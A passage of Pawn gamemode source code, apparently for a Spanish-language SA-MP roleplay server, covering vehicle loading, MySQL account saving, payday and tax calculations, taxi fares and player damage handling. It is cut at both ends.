		    cache_get_field_content(0, "VehCompSlot8", result); 		VehicleInfo[id][VehCompSlot][8] = strval(result);
		    cache_get_field_content(0, "VehCompSlot9", result); 		VehicleInfo[id][VehCompSlot][9] = strval(result);
		    cache_get_field_content(0, "VehCompSlot10", result); 		VehicleInfo[id][VehCompSlot][10] = strval(result);
		    cache_get_field_content(0, "VehCompSlot11", result); 		VehicleInfo[id][VehCompSlot][11] = strval(result);
		    cache_get_field_content(0, "VehCompSlot12", result); 		VehicleInfo[id][VehCompSlot][12] = strval(result);
		    cache_get_field_content(0, "VehCompSlot13", result); 		VehicleInfo[id][VehCompSlot][13] = strval(result);
		}

		if(VehicleInfo[id][VehType] == VEH_NONE || VehicleInfo[id][VehModel] < 400 || VehicleInfo[id][VehModel] > 611) {
 			CreateVehicle(411, 9999.0, 9999.0, 0.0, 0.0, 1, 1, -1);

		} else {
			if(VehicleInfo[id][VehType] == VEH_DEALERSHIP || VehicleInfo[id][VehType] == VEH_DEALERSHIP2 || VehicleInfo[id][VehType] == VEH_SHIPYARD) {
			    // Veh�culos de consecionaria.
                VehicleInfo[id][VehColor1] = random(255);
				VehicleInfo[id][VehColor2] = random(255);
				CreateVehicle(VehicleInfo[id][VehModel], VehicleInfo[id][VehPosX], VehicleInfo[id][VehPosY], VehicleInfo[id][VehPosZ], VehicleInfo[id][VehAngle], VehicleInfo[id][VehColor1], VehicleInfo[id][VehColor2], 1800);

			} else if(VehicleInfo[id][VehType] == VEH_RENT) {
			    // Veh�culos de renta.
			    for(new i = 1; i < MAX_RENTCAR; i++) {
			    	if(RentCarInfo[i][rVehicleID] < 1) { // Si ese slot no est� cargado
                    	RentCarInfo[i][rVehicleID] = id;
                    	RentCarInfo[i][rOwnerSQLID] = 0;
                    	RentCarInfo[i][rTime] = 0;
                    	RentCarInfo[i][rRented] = 0;
                    	break; // Salimos porque ya lo cargamos en el primero libre
                    }
				}
				VehicleInfo[id][VehLocked] = 0;
    			VehicleInfo[id][VehColor1] = random(255);
				VehicleInfo[id][VehColor2] = random(255);
                CreateVehicle(VehicleInfo[id][VehModel], VehicleInfo[id][VehPosX], VehicleInfo[id][VehPosY], VehicleInfo[id][VehPosZ], VehicleInfo[id][VehAngle], VehicleInfo[id][VehColor1], VehicleInfo[id][VehColor2], -1);

			} else if(VehicleInfo[id][VehType] == VEH_JOB) {
			    // Veh�culos de empleo.
                CreateVehicle(VehicleInfo[id][VehModel], VehicleInfo[id][VehPosX], VehicleInfo[id][VehPosY], VehicleInfo[id][VehPosZ], VehicleInfo[id][VehAngle], VehicleInfo[id][VehColor1], VehicleInfo[id][VehColor2], 1800);

			} else if(VehicleInfo[id][VehType] == VEH_SCHOOL) {
			    // Veh�culos de licencia.
                CreateVehicle(VehicleInfo[id][VehModel], VehicleInfo[id][VehPosX], VehicleInfo[id][VehPosY], VehicleInfo[id][VehPosZ], VehicleInfo[id][VehAngle], VehicleInfo[id][VehColor1], VehicleInfo[id][VehColor2], 1800);

			} else if(VehicleInfo[id][VehType] == VEH_FACTION) {
			    // Veh�culos de facci�n.
                CreateVehicle(VehicleInfo[id][VehModel], VehicleInfo[id][VehPosX], VehicleInfo[id][VehPosY], VehicleInfo[id][VehPosZ], VehicleInfo[id][VehAngle], VehicleInfo[id][VehColor1], VehicleInfo[id][VehColor2], 3600);

			} else {
			    // Otros.
			    CreateVehicle(VehicleInfo[id][VehModel], VehicleInfo[id][VehPosX], VehicleInfo[id][VehPosY], VehicleInfo[id][VehPosZ], VehicleInfo[id][VehAngle], VehicleInfo[id][VehColor1], VehicleInfo[id][VehColor2], -1);
			}

			SetVehicleParamsEx(id, 0, VehicleInfo[id][VehLights], VehicleInfo[id][VehAlarm], 0, VehicleInfo[id][VehBonnet], VehicleInfo[id][VehBoot], VehicleInfo[id][VehObjective]);
		}
		SetVehicleNumberPlate(id, VehicleInfo[id][VehPlate]);
		SetVehicleToRespawn(id);
    }
	return 1;
}

public SaveAccount(playerid)
{
	if(dontsave)
		return 1;

	if(gPlayerLogged[playerid] && !cheater[playerid])
	{
		new name[MAX_PLAYER_NAME],
			query[1536],
			day,
			month,
			year,
			hour,
			minute,
			second;

		getdate(year,month,day);
		gettime(hour,minute,second);

		GetPlayerName(playerid, name, 24);
		mysql_real_escape_string(name, name,1,sizeof(name));
		
        if(AdminDuty[playerid])
		{
			PlayerInfo[playerid][pHealth] = GetPVarFloat(playerid, "tempHealth");
		}
		else if(CopDuty[playerid] || SIDEDuty[playerid])
		{
		}
		else
		{
		    GetPlayerArmour(playerid, PlayerInfo[playerid][pArmour]);
		}

		if(PlayerInfo[playerid][pSpectating] == INVALID_PLAYER_ID)
		{
			GetPlayerPos(playerid, PlayerInfo[playerid][pX], PlayerInfo[playerid][pY], PlayerInfo[playerid][pZ]);
			GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pA]);
			PlayerInfo[playerid][pInterior] = GetPlayerInterior(playerid);
			PlayerInfo[playerid][pVirtualWorld] = GetPlayerVirtualWorld(playerid);
		}

		// String.
		format(query, sizeof(query), "UPDATE accounts SET Ip = '%s', Name = '%s'",
			PlayerInfo[playerid][pIP],
			name
		);

		// Integer.
		format(query,sizeof(query),"%s,Level=%d,AdminLevel=%d,AccountBlocked=%d,pRegStep=%d,Tutorial=%d,Sex=%d,Age=%d,Exp=%d,CashMoney=%d,BankMoney=%d,Skin=%d,pMask=%d,pHunger=%d,Job=%d,pJobAllowed=%d,JobTime=%d,PlayingHours=%d,PayCheck=%d,pPayTime=%d,Faction=%d,Rank=%d,HouseKey=%d,BizKey=%d,Warnings=%d,pTakeInputs=%d,HouseKeyIncome=%d",
			query,
			PlayerInfo[playerid][pLevel],
			PlayerInfo[playerid][pAdmin],
			PlayerInfo[playerid][pAccountBlocked],
			PlayerInfo[playerid][pRegStep],
			PlayerInfo[playerid][pTutorial],
			PlayerInfo[playerid][pSex],
			PlayerInfo[playerid][pAge],
			PlayerInfo[playerid][pExp],
			PlayerInfo[playerid][pCash],
			PlayerInfo[playerid][pBank],
			PlayerInfo[playerid][pSkin],
			PlayerInfo[playerid][pMask],
			PlayerInfo[playerid][pHunger],
			PlayerInfo[playerid][pJob],
			PlayerInfo[playerid][pJobAllowed],
			PlayerInfo[playerid][pJobTime],
			PlayerInfo[playerid][pPlayingHours],
			PlayerInfo[playerid][pPayCheck],
			GetPVarInt(playerid, "pPayTime"),
			PlayerInfo[playerid][pFaction],
			PlayerInfo[playerid][pRank],
			PlayerInfo[playerid][pHouseKey],
			PlayerInfo[playerid][pBizKey],
			PlayerInfo[playerid][pWarnings],
			PlayerInfo[playerid][pTakeInputs],
			PlayerInfo[playerid][pHouseKeyIncome]
		);

		format(query,sizeof(query),"%s,pMuteB=%d,pRentCarID=%d,pRentCarRID=%d,pMarijuana=%d,pLSD=%d,pEcstasy=%d,pCocaine=%d,pCigarettes=%d,pLighter=%d,pRadio=%d,pFightStyle=%d,pAdictionAbstinence=%d",
		    query,
			PlayerInfo[playerid][pMuteB],
			PlayerInfo[playerid][pRentCarID],
			PlayerInfo[playerid][pRentCarRID],
			PlayerInfo[playerid][pMarijuana],
			PlayerInfo[playerid][pLSD],
			PlayerInfo[playerid][pEcstasy],
			PlayerInfo[playerid][pCocaine],
			PlayerInfo[playerid][pCigarettes],
			PlayerInfo[playerid][pLighter],
			PlayerInfo[playerid][pRadio],
			PlayerInfo[playerid][pFightStyle],
			PlayerInfo[playerid][pAdictionAbstinence]
		);
		format(query,sizeof(query),"%s, `CarLic`='%d', `FlyLic`='%d', `WepLic`='%d', `PhoneNumber`='%d', `PhoneCompany`='%d', `ListNumber`='%d', `Jailed`='%d', `JailedTime`='%d', `pThirst`='%d', `pInterior`='%d', `pWorld`='%d', `pHospitalized`='%d', `pWantedLevel`='%d', `pCantWork`='%d', `pJobLimitCounter`='%d'",
			query,
			PlayerInfo[playerid][pCarLic],
			PlayerInfo[playerid][pFlyLic],
			PlayerInfo[playerid][pWepLic],
			PlayerInfo[playerid][pPhoneNumber],
			PlayerInfo[playerid][pPhoneC],
			PlayerInfo[playerid][pListNumber],
			PlayerInfo[playerid][pJailed],
			PlayerInfo[playerid][pJailTime],
			PlayerInfo[playerid][pThirst],
			PlayerInfo[playerid][pInterior],
			PlayerInfo[playerid][pVirtualWorld],
			PlayerInfo[playerid][pHospitalized],
			PlayerInfo[playerid][pWantedLevel],
   			PlayerInfo[playerid][pCantWork],
   			GetPVarInt(playerid, "pJobLimitCounter")
		);

		// Date.
		format(query, sizeof(query), "%s,LastConnected='%02d-%02d-%02d %02d:%02d:%02d',pAccusedOf='%s',pAccusedBy='%s'",
			query,
			year,
			month,
			day,
			hour,
			minute,
			second,
			PlayerInfo[playerid][pAccusedOf],
			PlayerInfo[playerid][pAccusedBy]);

		// Si est� agonizando le seteamos la vida a 24 para que al relogear no le permita andar libremente como si estuviera curado.
		if(PlayerInfo[playerid][pHealth] == 25 || GetPVarInt(playerid, "disabled") == DISABLE_DYING)
		    PlayerInfo[playerid][pHealth] = 24;
		    
		// Float.
		format(query,sizeof(query),"%s, `pX`='%f', `pY`='%f', `pZ`='%f', `pA`='%f', `pAdictionPercent`='%f', `pHealth`='%f', `pArmour`='%f' WHERE `Id` = %d",
		    query,
		    PlayerInfo[playerid][pX],
		    PlayerInfo[playerid][pY],
		    PlayerInfo[playerid][pZ],
		    PlayerInfo[playerid][pA],
		    PlayerInfo[playerid][pAdictionPercent],
		    PlayerInfo[playerid][pHealth],
		    PlayerInfo[playerid][pArmour],
		    PlayerInfo[playerid][pID]);
			    
		mysql_function_query(dbHandle, query, false, "", "");

		if(ThiefJobInfo[playerid][pFelonLevel] >= 1) // Si fue o es delincuente (si tiene una tabla asociada)
		    saveThiefJob(playerid);

	}
	
	return 1;
}


stock GetPlayerSpeed(playerid, bool:kmh) {
    new
		Float:Vx,
		Float:Vy,
		Float:Vz,
		Float:rtn;

    if(IsPlayerInAnyVehicle(playerid)) {
		GetVehicleVelocity(GetPlayerVehicleID(playerid),Vx,Vy,Vz);
	} else {
		GetPlayerVelocity(playerid,Vx,Vy,Vz);
	}
    rtn = floatsqroot(floatabs(floatpower(Vx + Vy + Vz,2)));
    return kmh?floatround(rtn * 100 * 1.61):floatround(rtn * 100);
}

//=========================INGRESOS POR ENTORNO A NEGOCIOS======================

GetBusinessPayCheck(bizID)
{
	new payDayMoney;
	switch(Business[bizID][bType])
	{
		case BIZ_REST: 		payDayMoney = Business[bizID][bPrice] / 434; // 0.23 porciento
		case BIZ_CLUB: 		payDayMoney = Business[bizID][bPrice] / 500; // 0.20 porciento
		case BIZ_CLUB2:		payDayMoney = Business[bizID][bPrice] / 384; // 0.26 porciento
		case BIZ_CASINO: 	payDayMoney = Business[bizID][bPrice] / 454; // 0.22 porciento
		case BIZ_HARD:  	payDayMoney = Business[bizID][bPrice] / 500; // 0.20 porciento
		case BIZ_AMMU: 		payDayMoney = Business[bizID][bPrice] / 357; // 0.28 porciento
		case BIZ_247: 		payDayMoney = Business[bizID][bPrice] / 333; // 0.30 porciento
		case BIZ_PHON: 		payDayMoney = Business[bizID][bPrice] / 400; // 0.25 porciento
		case BIZ_ADVE: 		payDayMoney = Business[bizID][bPrice] / 434; // 0.23 porciento
		case BIZ_CLOT2:		payDayMoney = Business[bizID][bPrice] / 454; // 0.22 porciento
		case BIZ_CLOT:	 	payDayMoney = Business[bizID][bPrice] / 500; // 0.20 porciento
		case BIZ_PIZZERIA: 	payDayMoney = Business[bizID][bPrice] / 434; //0.23 porciento
		case BIZ_BURGER1: 	payDayMoney = Business[bizID][bPrice] / 384; // 0.26 porciento
		case BIZ_BURGER2: 	payDayMoney = Business[bizID][bPrice] / 384; // 0.26 porciento
		case BIZ_BELL:      payDayMoney = Business[bizID][bPrice] / 400; // 0.25 porciento
		case BIZ_ACCESS:    payDayMoney = Business[bizID][bPrice] / 500; // 0.20 porciento
		default: 			payDayMoney = 0;
	}
	payDayMoney += GetBusinessTaxes(bizID); // 0.25 porciento adicional que nos va a cobrar de impuestos
	payDayMoney += 50 * GetItemPrice(ITEM_ID_PRODUCTOS); // lo que nos saca de productos el entorno
	return payDayMoney;
}

GetBusinessTaxes(bizID)
{
	return Business[bizID][bPrice] / 400; // 0.25 porciento del valor de compra
}

//===================================PAYDAY=====================================

public PayDay(playerid)
{
    if(gPlayerLogged[playerid])
	{
        switch(PlayerInfo[playerid][pFaction])
		{
            case FAC_PMA:
			{
                switch(PlayerInfo[playerid][pRank])
				{
	                case 1: PlayerInfo[playerid][pPayCheck] += 3000;
	                case 2: PlayerInfo[playerid][pPayCheck] += 2800;
	                case 3: PlayerInfo[playerid][pPayCheck] += 2600;
	                case 4: PlayerInfo[playerid][pPayCheck] += 2400;
	                case 5: PlayerInfo[playerid][pPayCheck] += 2200;
	                case 6: PlayerInfo[playerid][pPayCheck] += 2000;
	                case 7: PlayerInfo[playerid][pPayCheck] += 1800;
	                case 8: PlayerInfo[playerid][pPayCheck] += 1600;
	                case 9: PlayerInfo[playerid][pPayCheck] += 1000;
	                case 10: PlayerInfo[playerid][pPayCheck] += 1000;
	            }
            }
            case FAC_HOSP:
			{
                switch(PlayerInfo[playerid][pRank])
				{
	                case 1: PlayerInfo[playerid][pPayCheck] += 3000;
	                case 2: PlayerInfo[playerid][pPayCheck] += 2800;
	                case 3: PlayerInfo[playerid][pPayCheck] += 2600;
	                case 4: PlayerInfo[playerid][pPayCheck] += 2400;
	                case 5: PlayerInfo[playerid][pPayCheck] += 2200;
	                case 6: PlayerInfo[playerid][pPayCheck] += 2000;
	                case 7: PlayerInfo[playerid][pPayCheck] += 1800;
	                case 8: PlayerInfo[playerid][pPayCheck] += 1600;
	                case 9: PlayerInfo[playerid][pPayCheck] += 1000;
	                case 10: PlayerInfo[playerid][pPayCheck] += 1000;
	            }
            }
            case FAC_MECH:
			{
                switch(PlayerInfo[playerid][pRank])
				{
	                case 1: PlayerInfo[playerid][pPayCheck] += 2000;
	                case 2: PlayerInfo[playerid][pPayCheck] += 1850;
	                case 3: PlayerInfo[playerid][pPayCheck] += 1700;
	                case 4: PlayerInfo[playerid][pPayCheck] += 1550;
	                case 5: PlayerInfo[playerid][pPayCheck] += 1400;
	                case 6: PlayerInfo[playerid][pPayCheck] += 1250;
	                case 7: PlayerInfo[playerid][pPayCheck] += 1000;
	                case 8: PlayerInfo[playerid][pPayCheck] += 1000;
	                case 9: PlayerInfo[playerid][pPayCheck] += 1000;
	                case 10: PlayerInfo[playerid][pPayCheck] += 1000;
	            }
            }
            case FAC_MAN:
			{
                switch(PlayerInfo[playerid][pRank])
				{
	                case 1: PlayerInfo[playerid][pPayCheck] += 2600;
	                case 2: PlayerInfo[playerid][pPayCheck] += 2300;
	                case 3: PlayerInfo[playerid][pPayCheck] += 2000;
	                case 4: PlayerInfo[playerid][pPayCheck] += 1700;
	                case 5: PlayerInfo[playerid][pPayCheck] += 1400;
	                case 6: PlayerInfo[playerid][pPayCheck] += 1000;
	                case 7: PlayerInfo[playerid][pPayCheck] += 1000;
	                case 8: PlayerInfo[playerid][pPayCheck] += 1000;
	                case 9: PlayerInfo[playerid][pPayCheck] += 1000;
	                case 10: PlayerInfo[playerid][pPayCheck] += 1000;
	            }
            }
            case FAC_SIDE:
			{
                switch(PlayerInfo[playerid][pRank])
				{
	                case 1: PlayerInfo[playerid][pPayCheck] += 3000;
	                case 2: PlayerInfo[playerid][pPayCheck] += 2800;
	                case 3: PlayerInfo[playerid][pPayCheck] += 2600;
	                case 4: PlayerInfo[playerid][pPayCheck] += 2400;
	                case 5: PlayerInfo[playerid][pPayCheck] += 2200;
	                case 6: PlayerInfo[playerid][pPayCheck] += 2000;
	                case 7: PlayerInfo[playerid][pPayCheck] += 1800;
	                case 8: PlayerInfo[playerid][pPayCheck] += 1600;
	                case 9: PlayerInfo[playerid][pPayCheck] += 1000;
	                case 10: PlayerInfo[playerid][pPayCheck] += 1000;
	            }
            }
            case FAC_GOB:
			{
                switch(PlayerInfo[playerid][pRank])
				{
	                case 1: PlayerInfo[playerid][pPayCheck] += 3500;
	                case 2: PlayerInfo[playerid][pPayCheck] += 3300;
	                case 3: PlayerInfo[playerid][pPayCheck] += 3100;
	                case 4: PlayerInfo[playerid][pPayCheck] += 2900;
	                case 5: PlayerInfo[playerid][pPayCheck] += 2700;
	                case 6: PlayerInfo[playerid][pPayCheck] += 2500;
	                case 7: PlayerInfo[playerid][pPayCheck] += 2300;
	                case 8: PlayerInfo[playerid][pPayCheck] += 2100;
	                case 9: PlayerInfo[playerid][pPayCheck] += 1900;
	                case 10: PlayerInfo[playerid][pPayCheck] += 1000;
	            }
            }
            default:
			{
            	if(PlayerInfo[playerid][pJob] == 0 || PlayerInfo[playerid][pJob] == JOB_FELON || PlayerInfo[playerid][pJob] == JOB_DRUGF) // ASIGNACION A LOS DESEMPLEADOS
            		PlayerInfo[playerid][pPayCheck] += 600;
				if(PlayerInfo[playerid][pJob] == JOB_DRUGD) //M�nimo por si no hay ventas
				    PlayerInfo[playerid][pPayCheck] += 800;
                if(PlayerInfo[playerid][pJob] == JOB_TAXI) //M�nimo por si no hay pasajeros disponibles
            		PlayerInfo[playerid][pPayCheck] += 1200;
			}
        }
        
		//===========================IMPUESTOS==================================

		new tax = calculateVehiclesTaxes(playerid);
		
		if(House[PlayerInfo[playerid][pHouseKeyIncome]][Income] != 0)
		{
			tax += (House[PlayerInfo[playerid][pHouseKeyIncome]][HousePrice] / 100) / 7; //0.15 porciendo del precio aprox.
		}
		if(PlayerInfo[playerid][pHouseKey] != 0 && House[PlayerInfo[playerid][pHouseKey]][Income] == 0)
		{
  			tax += (House[PlayerInfo[playerid][pHouseKey]][HousePrice] / 100) / 7; //0.15 porciendo del precio aprox.
  		}
		    
		//============================NEGOCIOS==================================
		
		new bizID = PlayerInfo[playerid][pBizKey], bizPay = 0, bizTax = 0;
		if(bizID != 0)
		{
		    bizTax = GetBusinessTaxes(bizID);
  			Business[bizID][bTill] -= bizTax;
		    openBizPermission[bizID] = true;
		    if(Business[bizID][bLocked] == 0 && Business[bizID][bProducts] >= 50)
		    {
		        bizPay = GetBusinessPayCheck(bizID);
			    Business[bizID][bTill] += bizPay;
		     	Business[bizID][bProducts] -= 50; // minimo que se descuenta para obtener ganancias del entorno
			}
		}
		
		//========================CONTROL DE BARRIOS============================
		
		new gangProfits = 0;
		if(PlayerInfo[playerid][pFaction] != 0)
		{
		    if(FactionInfo[PlayerInfo[playerid][pFaction]][fType] == FAC_TYPE_GANG && PlayerInfo[playerid][pRank] == 1)
			{
			    gangProfits = GetGangZoneLiderIncome(playerid);
				GiveFactionMoney(PlayerInfo[playerid][pFaction], gangProfits);
			}
		}
        
        //========================COSTOS BANCARIOS==============================

		new banktax = (PlayerInfo[playerid][pBank] / 100) / 34; // 0.030% del dinero en la cuenta
		if(banktax < 50)
		    banktax = 50; // M�nimo de 50 pesos por tener la cuenta abierta
		    
		//========================ALQUILER DE VIVIENDAS=========================
		
		new pago = House[PlayerInfo[playerid][pHouseKeyIncome]][IncomePrice];
		new pago2 = House[PlayerInfo[playerid][pHouseKey]][IncomePriceAdd];
		new alquiler = 0;
		new alquileradd = 0;
		
		if(PlayerInfo[playerid][pHouseKeyIncome] != 0)
		{
			alquiler = pago;
	 		if(House[PlayerInfo[playerid][pHouseKeyIncome]][Owned] != 0)
		 	{
				new h = PlayerInfo[playerid][pHouseKeyIncome];
		        House[h][IncomePriceAdd] += pago;
		        SaveHouse(h);
			}
		}
		if(House[PlayerInfo[playerid][pHouseKey]][IncomePriceAdd] != 0)
		{
			alquileradd = pago2;
			new h = PlayerInfo[playerid][pHouseKey];
	        House[h][IncomePriceAdd] -= pago2;
	        SaveHouse(h);
		}
        
        //============================INGRESOS==================================

	    new newbank = PlayerInfo[playerid][pBank] + PlayerInfo[playerid][pPayCheck] - tax - alquiler + alquileradd - banktax;
	    
		GiveFactionMoney(FAC_GOB, tax);
		GiveFactionMoney(FAC_GOB, bizTax);

		//=============================EMPLEO===================================
		
		if(PlayerInfo[playerid][pCantWork] > 0 && PlayerInfo[playerid][pJailed] == 0)
		    PlayerInfo[playerid][pCantWork] = 0;
		jobBreak[playerid] = 80;
		SetPVarInt(playerid, "pJobLimitCounter", 0);
		
		//======================================================================
		
		SendClientMessage(playerid, COLOR_YELLOW, "============================[DIA DE PAGO]============================");
	    SendFMessage(playerid, COLOR_WHITE, "- Salario: $%d - Impuestos: $%d - Servicios bancarios: $%d", PlayerInfo[playerid][pPayCheck], tax, banktax);
	    SendFMessage(playerid, COLOR_WHITE, "- Balance anterior: $%d - Nuevo balance: $%d", PlayerInfo[playerid][pBank], newbank);
		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{878EE7}[INFO]:{C8C8C8} El dinero ha sido depositado en su cuenta bancaria.");
		if(bizID != 0)
		{
  			SendFMessage(playerid, COLOR_WHITE, "[Negocio %s] Ingresos: $%d - Impuestos: $%d - Balance de caja: $%d - Productos: %d", Business[bizID][bName], bizPay, bizTax, Business[bizID][bTill], Business[bizID][bProducts]);
	        SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{878EE7}[INFO]:{C8C8C8} Si tu negocio est� cerrado o con falta de stock (m�n 50 prod), no dejar� ganancias en la caja.");
		}
		if(gangProfits > 0)
		    SendFMessage(playerid, COLOR_WHITE, "[Facci�n %s] Los barrios nos han generado ingresos por $%d a la cuenta de la facci�n.", FactionInfo[PlayerInfo[playerid][pFaction]][fName], gangProfits);
		if(alquiler > 0 || alquileradd > 0)
		    SendFMessage(playerid, COLOR_WHITE, "[Alquiler] Ingresos $%d - Impuestos: $%d", pago2, pago);
		
		PlayerInfo[playerid][pBank] = newbank;
		PlayerInfo[playerid][pPayCheck] = 0;
		PlayerInfo[playerid][pExp]++;
		PlayerInfo[playerid][pPlayingHours] += 1;
		if(PlayerInfo[playerid][pJobTime] > 0)	{
			PlayerInfo[playerid][pJobTime]--; // Reducimos la cantidad de tiempo que tiene que esperar para poder tomar otro empleo.
		}
		
		ResetPlayerInputs(playerid);

		new expamount = (PlayerInfo[playerid][pLevel] + 1) * ServerInfo[svLevelExp];

		if(PlayerInfo[playerid][pExp] < expamount)
		{
			SendFMessage(playerid, COLOR_WHITE, "(( Tienes %d/%d puntos de respeto. ))", PlayerInfo[playerid][pExp], expamount);
		}
		else
		{
		    PlayerInfo[playerid][pExp] = 0;
		    PlayerInfo[playerid][pLevel]++;
		    expamount = (PlayerInfo[playerid][pLevel] + 1) * ServerInfo[svLevelExp];
		    SendFMessage(playerid, COLOR_WHITE, "(( �Su cuenta es ahora nivel %d! �Acumula %d puntos de experiencia para el proximo nivel! ))", PlayerInfo[playerid][pLevel],expamount);
		}
		SendClientMessage(playerid, COLOR_YELLOW, "===================================================================");
		RentalExpiration(playerid);
	}
}

public accountTimer()
{
    foreach(new playerid : Player)
	{
	    if(gPlayerLogged[playerid]) {
			SaveAccount(playerid);
		}
	}
}

stock syncPlayerTime(const playerid)
{
	if(GetPVarInt(playerid, "drugEffect") > 0)
	{ // No se hace nada
	} else
		if(GetPlayerInterior(playerid) == 0 && GetPlayerVirtualWorld(playerid) == 0 )
		{
			SetPlayerWeather(playerid, weatherVariables[0]);
		} else
			SetPlayerWeather(playerid, INTERIOR_WEATHER_ID);
	return SetPlayerTime(playerid, gTime[0], gTime[1]);
}

public BackupClear(playerid, calledbytimer) {
	if(IsPlayerConnected(playerid)) {
		if(PlayerInfo[playerid][pFaction] != FAC_SIDE && PlayerInfo[playerid][pFaction] != FAC_PMA && PlayerInfo[playerid][pFaction] != FAC_HOSP) return 1;

		if(CopDuty[playerid] == 0 && SIDEDuty[playerid] == 0 && MedDuty[playerid] == 0) {
	    	SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en servicio!");
	    	return 1;
		}
		if(GetPVarInt(playerid, "requestingBackup") == 1) {
			foreach(Player, i) {
				if(PlayerInfo[i][pFaction] == 1 || PlayerInfo[i][pFaction] == 2) {
					SetPlayerMarkerForPlayer(i, playerid, 0xFFFFFF00);
				}
			}
			if(calledbytimer != 1)	{
				SendClientMessage(playerid, COLOR_YELLOW2, "Su solicitud de refuerzos ha sido eliminada.");
			} else {
				SendClientMessage(playerid, COLOR_YELLOW2, "Su solicitud de refuerzos ha sido eliminada autom�ticamente.");
			}
			DeletePVar(playerid, "requestingBackup");
		} else {
			if(calledbytimer != 1)	{
				SendClientMessage(playerid, COLOR_YELLOW2, "�No tienes ninguna solicitud activa todav�a!");
			}
		}
	}
	return 1;
}

stock chargeTaxis()
{
	if(--TaxiTimer<0)
	{
		new string[128];
		TaxiTimer=PRICE_TAXI_INTERVAL;
		foreach(new playerid : Player)
		{
			if(gPlayerLogged[playerid])
			{
				if(PlayerInfo[playerid][pJob] == JOB_TAXI && jobDuty[playerid] && TransportPassenger[playerid] < 999 && TaxiTimer==PRICE_TAXI_INTERVAL)
				{
					if(GetPlayerCash(TransportPassenger[playerid]) >= TransportCost[playerid])
					{
						TransportCost[playerid] += PRICE_TAXI;
						format(string, sizeof(string), "~w~Tarifa: ~g~$%d", TransportCost[playerid]);
						GameTextForPlayer(playerid, string , 1000, 4);
						format(string, sizeof(string), "~r~Tarifa: ~g~$%d", TransportCost[playerid]);
						GameTextForPlayer(TransportPassenger[playerid], string, 1000, 4);
					}
					else
					{
						GameTextForPlayer(playerid, "~r~El pasajero se ha quedado sin efectivo..." , 1000, 4);
						GameTextForPlayer(TransportPassenger[playerid], "~r~Te has quedado sin dinero...", 1000, 4);
						RemovePlayerFromVehicle(TransportPassenger[playerid]);
					}
				}
			}
		}
	}
}

/*stock isWeaponForHeadshot(weaponid)
{
	if(weaponid == WEAPON_COLT45 || weaponid == WEAPON_SILENCED || weaponid == WEAPON_DEAGLE ||
		weaponid == WEAPON_SHOTGUN ||weaponid == WEAPON_UZI || weaponid == WEAPON_MP5 ||
		weaponid == WEAPON_AK47 || weaponid == WEAPON_M4 || weaponid == WEAPON_TEC9 ||
		weaponid == WEAPON_RIFLE || weaponid == WEAPON_SNIPER )
	    return 1;

	return 0;
}*/

public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid, bodypart)
{
	new Float:armour;
    	
    GetPlayerArmour(playerid, armour);

    if(issuerid != INVALID_PLAYER_ID)
	{
		//==========================SPRAY NO SACA VIDA==========================
		
 		if(weaponid == WEAPON_SPRAYCAN)
            return 1;
	
	    //===============================TAZER==================================
	    
		if(checkTazer(playerid, issuerid, amount, weaponid))
		    return 1;

		//==============================HEADSHOT================================
		
		/*if(bodypart == BODY_PART_HEAD && TakeHeadShot[playerid] == 0 && isWeaponForHeadshot(weaponid))
		{
			SendFMessage(playerid, COLOR_WHITE, "Has recibido un disparo en la cabeza y entras en estado de agonia. Dicho disparo lo realizo %s", GetPlayerNameEx(issuerid));
		    SetPlayerHealthEx(playerid, 24);
            TakeHeadShot[playerid] = 1;
            return 1;
		}*/
		
		//==========================HERIDAS DE BALA=============================
		
		if(amount > 4.0)
			CheckDamageWound(playerid, weaponid, bodypart, Float:armour);

		//========================EFECTOS DE LA DROGA===========================
		
		if(weaponid == 0)
		{
		    if(DrugEffectEcstasy[issuerid] == false || DrugEffectMarijuana[playerid] == false)  // Si no tienen los 2 la droga contraria
		    {
			    if(DrugEffectEcstasy[issuerid] == true)
			    {
			    	amount = (amount / 10) * 17; // subimos 70 porciento el da�o a trompadas que inflige si esta drogado con LSD
	    			if(armour > 0)
						SetPlayerHealthEx(playerid, PlayerInfo[playerid][pHealth] - (amount / (armour / 2)) );
					else
						SetPlayerHealthEx(playerid, PlayerInfo[playerid][pHealth] - amount);
					return 1;
				}
				if(DrugEffectMarijuana[playerid] == true)
				{
	                amount = (amount / 2); // reducimos 50 porciento el da�o a trompadas que recibe si esta drogado con marihuana
					if(armour > 0)
						SetPlayerHealthEx(playerid, PlayerInfo[playerid][pHealth] - (amount / (armour / 2)));
					else
						SetPlayerHealthEx(playerid, PlayerInfo[playerid][pHealth] - amount);
					return 1;
				}
			}
		}
	}
	
	if(armour > 0.0)
	{
	    if(bodypart == BODY_PART_LEFT_ARM || bodypart == BODY_PART_RIGHT_ARM || bodypart == BODY_PART_LEFT_LEG || bodypart == BODY_PART_RIGHT_LEG)
            SetPlayerHealthEx(playerid, PlayerInfo[playerid][pHealth] - amount);
		else
			SetPlayerHealthEx(playerid, PlayerInfo[playerid][pHealth] - (amount / (armour / 2)));
	}
	else
 		SetPlayerHealthEx(playerid, PlayerInfo[playerid][pHealth] - amount);
 		
    return 1;
}

stock AccurateShot(playerid)
{
	new weathers[4] = {234, 22, 401, -234};
	SetPlayerWeather(playerid, weathers[random(4)]);
    SetPlayerDrunkLevel (playerid, 10500);
    GameTextForPlayer(playerid, "Te dieron un disparo certero", 5000, 1);
    if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
        ApplyAnimation(playerid, "SWEET", "SWEET_INJUREDLOOP", 4.0, 0, 0, 1, 0, 0);
    SetTimerEx("RecoverLastShot", 5000, false, "i", playerid);
    return 1;
}

stock CrossArmour(playerid)
{
	new weathers[4] = {234, 22, 401, -234};
	SetPlayerWeather(playerid, weathers[random(4)]);
	SetPlayerDrunkLevel (playerid, 10500);
	GameTextForPlayer(playerid, "Un disparo te ha atravesado el chaleco", 5000, 1);
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
			ApplyAnimation(playerid, "SWEET", "SWEET_INJUREDLOOP", 4.0, 0, 0, 1, 0, 0);
	SetTimerEx("RecoverLastShot", 5000, false, "i", playerid);
	return 1;
}

public RecoverLastShot(playerid)
{
	syncPlayerTime(playerid);
	SetPlayerDrunkLevel (playerid, 0);
	return 1;
}

stock CheckDamageWound(playerid, weaponid, bodypart, Float: armour)
{
	new wepProbability = 0,
